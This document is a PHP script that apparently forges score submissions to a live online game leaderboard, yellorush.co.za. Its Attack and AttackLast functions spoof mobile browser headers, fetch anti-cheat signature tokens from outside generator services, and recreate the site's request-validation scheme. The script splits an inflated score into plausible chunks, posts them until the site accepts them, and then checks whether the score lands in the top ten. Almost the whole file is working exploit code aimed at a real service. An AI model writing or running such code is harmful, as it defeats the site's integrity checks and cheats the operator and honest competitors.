<?php
function GetTargetScore($position_){
 $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.yellorush.co.za/');
        //curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: no-cache',
            'Connection: keep-alive',
            'Pragma: no-cache',
            'Host: www.yellorush.co.za',
            'Referer: https:/www.yellorush.co.za/',
            'Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'Sec-Ch-Ua-Mobile: ?1',
            'Sec-Ch-Ua-Platform: "Android"',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: same-origin',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        );
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

        
$html = curl_exec($ch);
curl_close($ch);

// Load HTML into DOMDocument
$dom = new DOMDocument();
@$dom->loadHTML($html); 

// Create a new DOMXPath instance
$xpath = new DOMXPath($dom);

// XPath query to select all rows in the table body
$query = "//tbody/tr";

// Execute the query and get the results
$rows = $xpath->query($query);

// Loop through each row to extract data
$scores = [];
$i = 0;
foreach ($rows as $row) {
$i++;
    $cells = $row->getElementsByTagName('td');
    if ($cells->length > 3) {
        // Extract the score from the fourth cell
        $score = trim($cells->item(3)->nodeValue);
        $scores[$i] = $score;
    }
}

return $scores[$position_];
}
function GetPosition ($cookie){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.yellorush.co.za/');
        //curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: no-cache',
            'Connection: keep-alive',
            'Cookie: '.$cookie,
            'Pragma: no-cache',
            'Referer: https:/www.yellorush.co.za/',
            'Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'Sec-Ch-Ua-Mobile: ?1',
            'Sec-Ch-Ua-Platform: "Android"',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: same-origin',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        );
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        
$html = curl_exec($ch);
curl_close($ch);

// Load HTML into DOMDocument
$dom = new DOMDocument();
@$dom->loadHTML($html); 

// Create a new DOMXPath instance
$xpath = new DOMXPath($dom);

// XPath query to select all rows in the table body
$query = "//tbody/tr";

// Execute the query and get the results
$rows = $xpath->query($query);

// Loop through each row to extract data
$scores = [];
$i = 0;
foreach ($rows as $row) {
$i++;
    $cells = $row->getElementsByTagName('td');
    if ($cells->length > 3) {
        // Extract the score from the fourth cell
        $score = trim($cells->item(3)->nodeValue);
        $scores[$i] = $score;
    }
}
$query = "//div[contains(@class, 'current-position')]/a";

$positionNode = $xpath->query($query);

$position = $positionNode->length > 0 ? trim($positionNode->item(0)->nodeValue) : "0";

$formattedPosition = ltrim($position, '0');

if ($formattedPosition === '') {
    $formattedPosition = '0';

}
return $formattedPosition;
}
function RandomUa(){
    $userAgents = [
   // "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
   //"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36 Edg/144.0.0.0",
        //"Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
];

// Select a random user agent
return $randomUserAgent = $userAgents[array_rand($userAgents)];
}
function AttackLast($url,$xavi,$score,$power,$memory,$increment,$uA,$array){
            //sleep(7);
            
            $query_str = parse_url($url, PHP_URL_QUERY);
            parse_str($query_str, $query_params);
            $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
            $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';
            $sigv1 = isset($query_params['sigv1']) ? $query_params['sigv1'] : '';

            $data = [
                'unique_id' => $unique_id,
                'game_id' => $game_id,
                'score' => $score,
                'scoreArray' => $array
            ];
            $jsonData = json_encode($data);

            echo "\nArray Data: $jsonData";

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://www.yellorush.co.za/aakado-mokalavo/{$game_id}/{$unique_id}");
            curl_setopt($ch, CURLOPT_POST, 1);
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                "Accept: */*",
                "Connection: keep-alive",
                "Host: www.yellorush.co.za",
                "Content-Type: application/json;charset=UTF-8; {$memory}",
                "Origin: https://www.yellorush.co.za",
                "Referer: {$url}",
                "X-Chavi: {$xavi}",
                "X-Sign: {$sigv1}",
                "X-Data-Str: {$jsonData}",
                "Device-Memory-Qut: 3",
                "X-Powered-Version: {$power}",
                "User-Agent: {$uA}"
            ]);
            
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
            curl_setopt($ch, CURLOPT_HEADER, true);
            
            $curl = curl_exec($ch);
            echo "Last Response: {$curl}\n";
            
            // Separate headers and body
            $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            $header = substr($curl, 0, $header_size);
            $body = substr($curl, $header_size);
            curl_close($ch);
            
            if (strpos($curl, "Score info is stored successfully.") !== false) {
                echo "\n{$score} was plugged successfully";
            } else {
                echo "\nServer error, or some shi!";
            }
            
            $x_power = X_Power($header);
            return $x_power;
            
}
function X_Power($header){
     $lines = explode("\r\n", $header);
        $trimmed_value = '';
        foreach ($lines as $line) {
            if (stripos($line, 'X-Powered-Version:') === 0) {
        $trimmed_value = trim(str_replace('X-Powered-Version:', '', $line));
        break;
          }
        }
        return $trimmed_value;
}

function X_timeout($header){
     $lines = explode("\r\n", $header);
        $trimmed_value = '';
        foreach ($lines as $line) {
            if (stripos($line, 'Fari-Feravva-No-Samay:') === 0) {
        $trimmed_value = trim(str_replace('Fari-Feravva-No-Samay:', '', $line));
        break;
          }
        }
        return $trimmed_value;
}

function Attack($url,$score,$power,$memory,$increment,$uA){
            
            $query_str = parse_url($url, PHP_URL_QUERY);
            parse_str($query_str, $query_params);
            $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
            $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';
            $sigv1 = isset($query_params['sigv1']) ? $query_params['sigv1'] : '';
           $xavi = "https://x-chavi-generator.vercel.app/token/{$unique_id}/{$game_id}/{$score}";

$ch = curl_init($xavi);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable verification temporarily

$content = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
} else {
    echo "\nkim xavi".$content; // Display or process the content as needed
}

curl_close($ch);

            $data = [
                'unique_id' => $unique_id,
                'game_id' => $game_id,
                'score' => $score
            ];
            $jsonData = json_encode($data);
            
             
             
           // echo "<br><hr>Xavi: $content\nArray: b4 $jsonData";
         $i=0;
           do {
            $i++;
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "https://www.yellorush.co.za/aakado-mokalavo/{$game_id}/{$unique_id}");
           curl_setopt($ch, CURLOPT_POST, 1);
           curl_setopt($ch, CURLOPT_HTTPHEADER, [
               "Accept: */*",
               "Connection: keep-alive",
               "Host: www.yellorush.co.za",
               "Content-Type: application/json;charset=UTF-8; {$memory}",
               "Origin: https://www.yellorush.co.za",
               "Referer: {$url}",
               "X-Chavi: {$content}",
               "X-Sign: {$sigv1}",
               "X-Data-Str: {$jsonData}",
               "Device-Memory-QUT: 2",
               "X-Powered-Version: {$power}",
               "User-Agent: {$uA}"
           ]);
           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
           curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
           curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
           curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
           curl_setopt($ch, CURLOPT_HEADER, 1);
           
           $curl = curl_exec($ch);
           $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
           $header = substr($curl, 0, $header_size);
           $body = substr($curl, $header_size);
           curl_close($ch);
           
           if (strpos($curl, "Score info is stored successfully.") !== false) {
               echo "\nRequest was successful!";
           } else {
               echo "\nServer error, or some shi!";
           }
           
           $x_power = X_Power($header);
           $X_timeout = X_timeout($header);
           }while(!is_numeric($X_timeout) && $i<=5);
           echo "<br><hr>Timeout: $X_timeout,";
        sleep($X_timeout);
           
                // sleep(10);
                return $x_power;
}
        function GetXavi($unique_id,$game_id,$score,$array){
             $arrayJson = json_encode($array);
            $url = "https://xaviold.vercel.app/token/$unique_id/$game_id/$score";
            $ch = curl_init($url . '/' . urlencode($arrayJson));

        // Set the options for the cURL session
        curl_setopt($ch, CURLOPT_POST, 1); // Set it to POST request
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response as a string
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
          'Content-Type: application/json'
        ));
        $response = curl_exec($ch);
        echo "\nToken: $response\nFor $arrayJson";
        return $response;

}


function generateRandomDivisionData($number,$url,$power,$memory,$increment,$uA,$gameScore = 1000) {
// $min = 10;
//  $max = 100;
    
 $min = 10;
$max = $gameScore;

// Step/precision follows $max: 2000->2000, 100->100, 15->15
$step = max(1, (int)$max);

// Helper: pick a random multiple of $step within [$LB, $UB]
 if (!function_exists('random_multiple_in_range')) {
function random_multiple_in_range($LB, $UB, $step) {
    $kMin = (int)ceil($LB / $step);
    $kMax = (int)floor($UB / $step);
    if ($kMin > $kMax) {
        // No exact multiple inside range; snap to nearest feasible within bounds
        $cand = max($LB, min($UB, $kMin * $step));
        if ($cand < $LB || $cand > $UB) {
            $cand = max($LB, min($UB, $kMax * $step));
        }
        return (int)$cand;
    }
    try {
        $k = random_int($kMin, $kMax);
    } catch (Throwable $e) {
        $k = (int)floor(($kMin + $kMax) / 2);
    }
    return (int)($k * $step);
}
 }
$data = [];
$differences = [];

if ($number <= $max) {
    $data[] = [[0]];
    $sizeValue = 1;
} else {
    $sizeValue = intdiv($number - 1, $max) + 1;
    $prev = $number;
    for ($i = $sizeValue - 1; $i >= 1; $i--) {
        if ($i == $sizeValue - 1) {
            $bandLB = ($i - 1) * $max + 1;
            $bandUB = $i * $max;
            $minForGap = $number - $max;
            $LB = max($bandLB, $minForGap);
            $UB = min($bandUB, $prev - 1);
        } elseif ($i == 1) {
            $bandLB = 1;
            $bandUB = $max;
            $minForGap = $prev - $max;
            $LB = max($bandLB, $minForGap);
            $UB = $bandUB;
        } else {
            $bandLB = ($i - 1) * $max + 1;
            $bandUB = $i * $max;
            $minForGap = $prev - $max;
            $LB = max($bandLB, $minForGap);
            $UB = min($bandUB, $prev - 1);
        }
        if ($LB > $UB) { $LB = $UB; }
        // Pick a value aligned to $step (dependent on $max)
        $d = random_multiple_in_range($LB, $UB, $step);
        $differences[] = $d;
        $prev = $d;
    }

    // Build the data array with 0 as the first element.
    $data = [];
    $data[] = [[0]];
    foreach ($differences as $d) {
        $data[] = [[$d]];
    }
    $sizeValue = count($data);
}

///sort
// Remove the first element (which always contains 0)
// $first = array_shift($data);

// // Sort the remaining elements in descending order based on the number
// usort($data, function($a, $b) {
//     return $b[0][0] <=> $a[0][0]; // Descending order
// });

// // Reinsert the first element at the beginning of the array
// array_unshift($data, $first);


///

$result = [
    "c2array" => true,
    "size"    => [$sizeValue, 1, 1],
    "data"    => $data
];


$data = array_filter($data, function($value) {
    return $value[0][0] != 0;
});
// Sort the data in ascending order
usort($data, function($a, $b) {
    return $a[0][0] - $b[0][0];
});


foreach ($data as $value) {
            
            $skore =  $value[0][0];
            //echo "\nSent $skore"; 
            $powerBefore = $power;
            $memory = validate_request($power,$skore);
            $increment = 1;
          
           $power = Attack($url,$skore,$power,$memory,$increment,$uA);
           
}
// if ($number>0){
//  $number = -$number;
// }
    $flash = json_encode($result);
    $query_str = parse_url($url, PHP_URL_QUERY);
    parse_str($query_str, $query_params);
    $unique_id = isset($query_params['unique_id']) ? $query_params['unique_id'] : '';
    $game_id = isset($query_params['game_id']) ? $query_params['game_id'] : '';

    $xavi = GetXavi($unique_id,$game_id,$number,$result);
    $cleanXavi = trim($xavi, '"');
    echo "\n my xavi => $cleanXavi";
    $memory = validate_request($power,$number);
    $power = AttackLast($url,$cleanXavi,$number,$power,$memory,$increment,$uA,$flash);
    return $power;
}


function validate_request($fetchKey2, $LOP) {
    $fetchKey2Array = str_split($fetchKey2);
    $lastElement = end($fetchKey2Array);
    $fetchKey2Array = ($lastElement == '0') ? array_slice($fetchKey2Array, 0, -1) : array_reverse(array_slice($fetchKey2Array, 0, -1));

    $emptyA = '';
    foreach (str_split((string)$LOP) as $element) {
        if (isset($fetchKey2Array[$element])) {
            $emptyA .= $fetchKey2Array[$element];
        }
    }
        /*echo "\nResult: " . $emptyA . "\n";
        echo "XPoweredVersion: " . $fetchKey2 . "\n";
        echo "DefaultScore: " . $LOP . "\n";*/
    return $emptyA;
}

function TargetScore(){

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://yellorush.co.za/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$html = curl_exec($ch);
curl_close($ch);
$dom = new DOMDocument();
@$dom->loadHTML($html); 

$xpath = new DOMXPath($dom);

$player1ScoreQuery = "//div[contains(@class, 'rank-1')]//p[contains(text(), 'Score')]";
$player2ScoreQuery = "//div[contains(@class, 'rank-2')]//p[contains(text(), 'Score')]";

$player1ScoreNode = $xpath->query($player1ScoreQuery);
$player2ScoreNode = $xpath->query($player2ScoreQuery);


$defaultPlayer1Score = "1000"; 
$defaultPlayer2Score = "10000"; 

$player1Score = $player1ScoreNode->length > 0 ? trim(str_replace("Score:", "", $player1ScoreNode->item(0)->nodeValue)) : $defaultPlayer1Score;
$player2Score = $player2ScoreNode->length > 0 ? trim(str_replace("Score:", "", $player2ScoreNode->item(0)->nodeValue)) : $defaultPlayer2Score;
return $player1Score;
}


function isScoreInTop10(int $myScore): bool {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://yellorush.co.za/');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
    ]);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_COOKIEFILE, __DIR__.'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, __DIR__.'/cookie.txt');

    $html = curl_exec($ch);
    curl_close($ch);

    if (!$html) return false;

    libxml_use_internal_errors(true);
    $dom = new DOMDocument();
    @$dom->loadHTML($html);
    libxml_clear_errors();

    $xpath = new DOMXPath($dom);

    for ($i = 1; $i <= 10; $i++) {

        // ORIGINAL logic (rank cards – works for top 3)
        $query = "//div[contains(concat(' ', normalize-space(@class), ' '), ' rank-$i ')]//p[contains(., 'Score')]";
        $nodes = $xpath->query($query);

        if ($nodes->length > 0) {
            $rawScore = trim($nodes->item(0)->textContent);
            $score = (int) preg_replace('/[^0-9]/', '', $rawScore);

            if ($score === $myScore) return true;
            continue;
        }

        // 🔧 MINIMAL FIX: fallback to leaderboard table (ranks 4–10)
        $tableQuery = "(//div[contains(@class,'leader-table')]//tbody/tr)[$i]/td[4]";
        $td = $xpath->query($tableQuery);

        if ($td->length > 0) {
            $score = (int) preg_replace('/[^0-9]/', '', trim($td->item(0)->textContent));
            if ($score === $myScore) return true;
        }
    }

    return false;
}
